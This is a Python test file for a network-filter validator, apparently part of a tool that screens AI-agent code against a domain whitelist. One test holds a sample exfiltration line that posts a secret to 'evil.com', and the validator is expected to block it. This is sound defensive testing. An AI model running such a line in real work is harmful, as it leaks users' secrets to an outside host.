"""
Tests for Layer 2 — Network Filter.
"""

import pytest

from agentguard.exceptions import SecurityBlockedError
from agentguard.policy import SecurityPolicy
from agentguard.validators.network_filter import NetworkFilter


def test_allows_code_without_network(default_policy: SecurityPolicy) -> None:
    """Code with no network calls should always pass."""
    code = "import math; result = math.pi"
    NetworkFilter(default_policy).validate(code)  # Should not raise


def test_blocks_all_network_when_no_whitelist(default_policy: SecurityPolicy) -> None:
    """When allowed_domains is empty, any network call should be blocked."""
    code = "import requests; requests.get('https://api.github.com/users')"
    with pytest.raises(SecurityBlockedError) as exc_info:
        NetworkFilter(default_policy).validate(code)
    assert "Network Filter" in str(exc_info.value)


def test_allows_whitelisted_domain(permissive_policy: SecurityPolicy) -> None:
    """A call to a whitelisted domain should pass."""
    code = "import requests; requests.get('https://api.github.com/repos')"
    NetworkFilter(permissive_policy).validate(code)  # Should not raise


def test_blocks_non_whitelisted_domain(permissive_policy: SecurityPolicy) -> None:
    """A call to a non-whitelisted domain should be blocked."""
    code = "import requests; requests.post('https://evil.com/exfiltrate', data=secret)"
    with pytest.raises(SecurityBlockedError) as exc_info:
        NetworkFilter(permissive_policy).validate(code)
    assert "evil.com" in str(exc_info.value)
